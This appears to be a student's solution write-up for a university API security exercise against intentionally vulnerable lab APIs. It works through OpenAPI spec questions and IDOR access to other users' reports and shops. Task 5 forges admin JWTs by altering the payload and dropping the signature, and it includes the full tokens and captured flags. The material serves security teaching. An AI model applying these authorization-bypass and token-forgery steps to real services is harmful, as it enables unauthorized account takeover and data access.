# Excersise 1

## Task 1

a) 2

b) `api_key: apiKey`

c) `api_key`

d) Neah, API-keys are still common practice but "dynamic" authentication token like JWTs / SSO-based authentication would be more secure (if correctly configured).
The tomtom API uses HTTPS, the sending the API key via query itself would be fine. One issue would be, for example, logging via the browser history.
This makes the aforementioned authentication methods preferable.

e)

```
Paths that support XML input data:
- /routing/{versionNumber}/calculateReachableRange/{origin}/{contentType}
- /routing/{versionNumber}/calculateRoute/{locations}/{contentType}
```

f) Number of endpoints with variables in the path: 2

## Task 2

a) 12

b)

```
Supported API version(s):
- v1.0
- v1.1
```

c)

```
Paths requiring Bearer authentication:
- /users/userinfo
- /users/{id}
- /users/change_password/{id}
- /users/update_userinfo
- /admins/users
- /admins/update_userinfo/{id}
- /admins/create_user
- /tokens/list
- /tokens/revoke
```

d)

```
Paths allowing Basic authentication:
- /authenticate
```

e)

```
Paths without any defined authentication mechanism:
- /authenticate (POST) (no 'security:' attribute)
- /companies/{id}
- /reset
```

## Task 3

a)
The "Vulnerable Users API" Postman collection was used via Bruno.
i)

- Using the credentials for the `natasha_romanoff` user, `/authenticate` returns `"id": "2"` and an `access_token`.
- Using the `access_token`, `/users/user` returns `"role": "normal"`

ii)
The "Vulnerable Users API" Postman collection was used via Bruno.

```
- Given a valid `access_token`, /users/user provides both id and role.
- Given a valid id and `access_token`, /users/user/{id} provides both id and role for the authenticated user.
- Given valid credentials, /authenticate only provides the id.
```

b)
The "Vulnerable Reports API" Postman collection was used via Bruno.
i)

- Using the credentials for the `bgreen` user, `/authenticate` returns `"id": "5"` and an `access_token`.
- Using the `access_token`, `/user` returns `"role": "employee"`

ii)

- Using the `access_token`, `/reports` (GET) returns reports with `"id": 4` and `"id": 9`
- iii)
- Yes. The endpoint to update an existing report's properties (including the `name`) is:
  HTTP method: PATCH
  Path: /reports (server base) -> full path: https://rest.e-hacking.de:443/rest-api-sec/vuln_reports/reports
- You must supply an Authorization header with `Bearer <access_token>` and include form data with at least `reportId`.
- To change the name include the `name` field in the form body.

c)
The "Vulnerable Reports API" Postman collection was used via Bruno.
i)

- Using the credentials for the `user1` user, `/authenticate` returns `"id": "12345678"` and an `access_token`.
- Using the `access_token`, `/users` returns `"role": "customer"`

ii)

- Using the `access_token`, `/users/shops` returns `[]`. The user does not own any shops.

iii)

- Using the `/shops` Endpoint, one can see that the shop `Adventure Goods` has the id `87654325`
- Using the `/shops/{shop_id}` Endpoint using the `access_token`, looking up the id `87654325` returns the user id `45678901` as owner

iv)

- Using the `/shops` Endpoint, one can see that the shop `Bike World` has the id `87654322`
- Using the `/shops/{shop_id}/products` Endpoint using the `access_token` and looking up the id `87654322`, one can see that the BMX costs 300 (Dollars? Euros?)

## Task 4

The "Vulnerable Reports API" Postman collection was used via Bruno.
i)

- Using the credentials for the `bgreen` user, `/authenticate` returns an `access_token` and `"id": "5"`.
  - Using the `access_token`, the `/user` Endpoint returns that `bgreen` has the `role` "employee", thus is only able to see his own reports.
- Using the `access_token`, the `/reports` Endpoint returns, that the user created the reports with the ids `4` and `9`.
- However, using the `/reports/{reportId}` endpoint, using `reportId` 1, a report from the user with `"creator_id": 2` gets returned. The user with that `id` is the user `asmith` with the `role` "manager".
  - All other reports (except 4 and 9) return `"error": "Not allowed to see report from a different department!"`

ii)

- Using the credentials for the `asmith` user, `/authenticate` returns an `access_token` and `"id": "2"`.
  - Using the `access_token`, the `/user` Endpoint returns that `asmith` has the `role` "manager", thus is only able to see omly reports of the same department.
- Using the `access_token`, the `/reports` Endpoint returns, that the user can view the reports with the ids `1`, `4` and `9`.
- However, using the `/reports/{reportId}` endpoint, using `reportId` 2, a report from the department "hr" (instead of "finance") gets returned.

## Task 5

The "Vulnerable Users API" Postman collection was used via Bruno.
i)

- At the `/authenticate` (POST) Endpoint, send the credentials of user `natasha_romanoff` via `Basic Auth`.
- In the Body, set `username` to `admin`. This returns:
```
{
  "id": "61",
  "name": "admin",
  "access_token": "eyJ0eXAiOiJKV1QiLCJnaWQiOiIxNzcxMjU2My0zZGQ1LTRlZTctOWNjNC1hZjczMmI4MTA4OTIiLCJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsInVzZSI6InNpZyIsImtpZCI6ImIyNzlkMTkxLTNjZDEtNDE5MC1iYmEwLTM3ODhmZWRhNTY2NCIsIm4iOiIwTG1rWXBFNGNtaDJGczk1bVlnVlNESGVQaFVkUktBZXBHTlhySHVKNndBZE5HZ1p4VFBpcnBZd29oY2IwQVRYbU1PMHpBV0Zrbkhna3VJdlRJall6N0NMYmZfQWhtbjlGakhnQkRtNmdNVTdwUmlyWDFac0FRSmZXSmJyV2I5NnBHYk12Ry1FUFJicDgzcGlPWk1OenoyOG9WZ0ZlaloyWERxQXlYVlVteVZPMlJ3cC1CLUhIMHlwVVJmeEFtSmQ0MEtwdHRYZHktNk5LajA2OUVSajJ1MWNhZGFSVm9vU2hrM2ZIekRDQWc2Z1gwa3lRN2pWVEpzcjIzYzZueHhSZzNJVVV4NTRtTUhvMU9EdWVDSHo4X3Y1SVZ2ajR2VnMxcVNRWGw3d1VReTVRTEdhWUc1TGJ5US1ZRGxtdmJLc3psVnhqSUEtc0dTZUZpQUtpdEpRUncifSwia2lkIjoiYjI3OWQxOTEtM2NkMS00MTkwLWJiYTAtMzc4OGZlZGE1NjY0In0.ewogICJpZCI6ICI2MSIsCiAgInVzZXJuYW1lIjogImFkbWluIiwKICAiY29tcGFueV9pZCI6ICJnb29nbGUiLAogICJyb2xlIjogInN1cGVyX2FkbWluIiwKICAiYWRkcmVzcyI6ICJCb2NodW0iCn0.GyqHNynZzJ7B6nh9tPMKEwQQG69tY3iFVNwTDJ1ot74AaOGDhPuLtLgf_EJB70khIqnUuvGlfVswr9LacvEayRDVGaPF9GYNvPMWDjIwxPXGlnxX7TGJA0yRqqvhUgM97i6fTGnZKUfkcrmutuYPfEdxQpAH9cf-iFydZmAlh8ASQpJN6sxjaYRqqskqeI-kpyO4seLhC8QyQmTRusVvDfARGgV7HzRg-iE8ajx2jxEp1uSImGvqRGkqM4C-do338ZtL6Q39dc1oxVoJaYIsfr1OyRE45sgaEHsEvVinrvae8Z_aTUZotx3cv5qDLKZPyjVuY7rHv6RQo2eSKLrVow"
}
```
- Using the JWT as Bearer Token at the `users/user` Endpoint, the following gets returned, which includes the Flag:
```
{
  "role": "super_admin",
  "address": "Bochum",
  "flag": "FLAG{rest_auth2_hvkUdoRZI1Ow0riC}",
  "company_id": "google",
  "id": "61",
  "username": "admin"
}
```

ii)

- Authenticate as user `natasha_romanoff` at endpoint `/authenticate` at get JWT in `access_token`.
- Change the payload of the received JWT to `"username": "admin"` and `"role": "super_admin"`.
- Use this token as bearer authentication against endpoint `/users/user` and execlude signature.
- Receive flag: `FLAG{rest_auth3_7cTDZYssl9cnO4aB}`

JWT to receive flag:

```
eyJ0eXAiOiJKV1QiLCJnaWQiOiIwODRjZjY1Zi00NjlhLTQ4ZmMtYjZmNi1lNWMwYjU5MjdmOWUiLCJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsInVzZSI6InNpZyIsImtpZCI6ImIyYWFhNzBhLTk1MTUtNDA0OC05MjMyLWVkNjAzNGRkYTA5OSIsIm4iOiJ4VThuQkF1bWxTR0V1N3owTTBuVnpyQkRWMTlkVjJXLW5KLVhZSGVXbEpuSF9ETVFhX2tadUlfNXBvTWszNEo0T25qOEdnYm5tcEV3ZHF6b0x0dy0tbm9HSVlVcGRLMFR6MG0tUHZnOTBVLThlSGlmb1phR1d1YzhtdjVtam4zVnNNT2RjQ1lCaUNpR05XdkNUb1JfRm5CYUdteU9aNUJRVkJIenlidkM5cy1KbjM2aVJQdC1BUm1fQ2ZWRmVhYVRab3lpc0loYzdFM1BKR1Y2X0tTcTJjZFh2c0ZZSjJteDBXdHhEWXdOZnZ5XzdfaWlFcWhZNDBnTlFqSzBaYml2OE9zSmVPcV9IVU0yeW5kREo2alhLWWo2NDhTZnQ2MUdhYzNiN25rY2xWV0RCUFJwYndhcUw3OU84YUpUNVJhR2MxRmtUWXR1enZxcEpmS3dLNlRRdXcifSwia2lkIjoiYjJhYWE3MGEtOTUxNS00MDQ4LTkyMzItZWQ2MDM0ZGRhMDk5In0.eyJhY2Nlc3NfdG9rZW4iOiIzMTBmNGJiMi1jMGVlLTRkMjEtOTkwOS0wNTc1ZTkwMmFlY2EiLCJpZCI6IjIiLCJ1c2VybmFtZSI6ImFkbWluIiwiY29tcGFueV9pZCI6ImFwcGxlIiwicm9sZSI6InN1cGVyX2FkbWluIiwiYWRkcmVzcyI6Ik1vc2NvdyJ9.
```

## Task 6

No time

## Task 7

No time

## Task 8

- Authenticates to the API by POST username and password to `/authenticate`, receives a Bearer `access_token`, and uses it for authorization on subsequent calls.
- Calls `PATCH /products/{PRODUCT_ID}` with the bearer token to update the product resource identified by `PRODUCT_ID`.
- The PATCH payload includes a `picture` field that contains an externally supplied URL (an absolute http(s) URL) — this is the only request field that causes the server to receive a client-controlled network target.
- If the server performs any server‑side fetch, validation, or processing of that `picture` URL, that server behavior is the likely SSRF attack surface.
